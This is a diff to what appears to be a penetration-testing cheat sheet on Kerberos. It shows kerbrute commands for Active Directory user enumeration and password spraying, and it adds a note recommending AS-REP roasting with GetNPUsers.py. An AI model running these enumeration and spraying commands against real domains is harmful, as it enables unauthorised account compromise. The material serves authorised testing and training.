@@ -160,6 +160,8 @@ Service : kerberos-sec  Microsoft Windows Kerberos
 # Enumerate the user
 root@kali:~# kerbrute userenum -d <domain_name> --dc <dns_domain_name> userlist.txt -t 100
 
+Important note : Once a list of user founded, try to obtain the TGT ticket (ASREPPROASTING through GetNPusers.py)
+
 # Password Spraying
 root@kali:~# ./kerbrute_linux_amd64 passwordspray -d <domain_name> domain-users.txt Password123
 ```
